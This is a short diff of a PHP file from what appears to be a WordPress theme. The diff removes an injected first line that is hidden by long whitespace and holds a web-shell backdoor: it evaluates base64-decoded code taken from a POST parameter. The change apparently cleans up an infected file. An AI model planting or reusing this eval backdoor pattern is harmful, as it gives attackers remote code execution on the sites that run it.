@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n78cd5a']));?><?php
+<?php
 
 // Exit if accessed directly
 if( !defined( 'ABSPATH' ) ) {
@@ -36,4 +36,5 @@ function responsive_free_get_option( $option, $default = false ) {
 
 	return $default;
 }
+
 ?>
